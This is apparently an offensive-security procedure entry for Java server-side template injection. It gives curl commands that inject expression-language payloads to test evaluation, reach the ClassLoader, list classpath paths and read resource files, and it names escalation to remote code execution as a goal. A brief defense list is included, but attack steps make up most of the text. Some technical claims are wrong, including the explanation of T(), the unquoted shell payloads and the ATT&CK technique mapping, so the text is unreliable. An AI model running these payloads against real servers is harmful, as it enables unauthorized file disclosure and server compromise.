---
id: 59eb354f-efde-41f1-b574-ba71bbf47b76
name: Java-SSTI-Basic-Injection-Using-ClassLoader-and-Resource-Retrieval
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.306709+00:00'
updated_at: '2024-01-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Template Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - '[[tags/Java]]'
  - '[[tags/Java - Basic injection]]'
  - '[[tags/Server Side Template Injection]]'
commands:
  - '[[commands/test-java-ssti-arithmetic-7-times-7]]'
  - '[[commands/test-java-ssti-classloader-info]]'
  - '[[commands/test-java-ssti-resource-path]]'
  - '[[commands/test-java-ssti-html-resource]]'
platforms:
  - Web
  - Java
tools: []
validated: true
---

# Java-SSTI-Basic-Injection-Using-ClassLoader-and-Resource-Retrieval

## Summary

This procedure demonstrates a basic Server-Side Template Injection (SSTI) attack in Java-based web applications using expression language (EL) or similar template engines like JSP, FreeMarker, or Thymeleaf. By injecting payloads that leverage the Java ClassLoader and resource retrieval methods, an attacker can execute arbitrary code, read sensitive resources, and potentially achieve remote code execution (RCE) to compromise the server.

## Description

Server-Side Template Injection occurs when user input is unsafely embedded into server-side templates without proper sanitization, allowing attackers to inject and execute code within the template processing context. In Java environments, this often involves injecting Expression Language (EL) expressions (e.g., ${...}) that can access Java internals like the ClassLoader. The ClassLoader enables loading arbitrary classes and resources from the classpath, which can be abused to read configuration files, execute system commands, or exfiltrate data. This procedure focuses on initial detection and basic exploitation steps, assuming a vulnerable endpoint where user-controlled input is rendered as a template (e.g., a search field or dynamic content generator). Success can lead to information disclosure or escalation to full RCE by chaining with Runtime.exec(). Target environments include Java web apps on Tomcat, Spring Boot, or similar, typically over HTTP/HTTPS.

## Requirements

1. Access to a Java-based web application with a vulnerable template endpoint (e.g., GET/POST parameter that renders user input as EL).
2. Knowledge of Java EL syntax and ClassLoader APIs.
3. Tools for sending HTTP requests (browser, curl, or proxy like Burp Suite).
4. Network access to the target application (no authentication required for initial tests, but may escalate).

## Defense

- Sanitize and validate all user inputs to templates using whitelisting or safe rendering modes (e.g., disable EL in JSP).
- Use parameterized queries or template engines with strict sandboxing (e.g., FreeMarker safe mode).
- Implement web application firewalls (WAF) to detect anomalous EL patterns like ${T(...)}.
- Monitor application logs for unexpected ClassLoader activity or resource access, and enable Java security managers to restrict code execution.

## Objectives

1. Confirm SSTI vulnerability by executing basic arithmetic expressions.
2. Access Java internals via ClassLoader to retrieve system information.
3. Read classpath resources to disclose sensitive files or paths.
4. Demonstrate potential for RCE by loading and executing arbitrary resources.

## Instructions

### Step 1: Test Basic SSTI with Arithmetic Expression

**Context**: Start with a simple mathematical expression to verify if the template engine evaluates injected code. This confirms the vulnerability without triggering alerts. Use a vulnerable endpoint like http://target.com/render?template=<input>.

**Command** ([[commands/test-java-ssti-arithmetic-7-times-7]]):
```bash
curl "$_TARGET_URL?template=${7*7}"
```

> This sends an HTTP request injecting the EL payload ${7*7}. If SSTI is present, the response will evaluate and display '49' instead of the literal string. Adjust the parameter name (e.g., 'template', 'query') based on the app. If using POST, add -d "template=${7*7}".

### Step 2: Retrieve ClassLoader Information

**Context**: Once basic SSTI is confirmed, inject a payload to access the system ClassLoader. This reveals the Java runtime environment and confirms access to core APIs, a prerequisite for further exploitation.

**Command** ([[commands/test-java-ssti-classloader-info]]):
```bash
curl "$_TARGET_URL?template=${T(java.lang.ClassLoader).getSystemClassLoader()}"
```

> The payload ${T(java.lang.ClassLoader).getSystemClassLoader()} invokes the ClassLoader constructor via reflection (T() is shorthand for newInstance). Expected response includes the ClassLoader object reference (e.g., 'jdk.internal.loader.ClassLoaders$AppClassLoader@3fee733d'). If it fails, the app may have restricted reflection.

### Step 3: Retrieve Resource Path

**Context**: Use the ClassLoader to query the classpath resource path. This discloses the application's directory structure, helping identify locations for further resource loading or file reads.

**Command** ([[commands/test-java-ssti-resource-path]]):
```bash
curl "$_TARGET_URL?template=${''.getClass().getClassLoader().getResource('').getPath()}"
```

> This payload gets the current class's ClassLoader and retrieves the path to the root resource directory. Expected output is a path like '/Users/username/project/src/main/resources/'. Use this to map the filesystem for targeted reads. If the path is absolute, it may reveal server details.

### Step 4: Load and Display Resource Content

**Context**: Escalate by loading and printing the content of a classpath resource (e.g., an HTML file). This demonstrates information disclosure and can be extended to sensitive files like web.xml or properties files.

**Command** ([[commands/test-java-ssti-html-resource]]):
```bash
curl "$_TARGET_URL?template=${T(java.lang.ClassLoader).getSystemClassLoader().getResourceAsStream('index.html').toString()}"
```

> The payload loads 'index.html' from the classpath using getResourceAsStream() and attempts to display its content. Expected output includes the HTML: '<!DOCTYPE html>...' . Note: Actual printing may require additional chaining (e.g., using BufferedReader for full text); adjust for the template engine. Success indicates potential for reading any accessible resource.
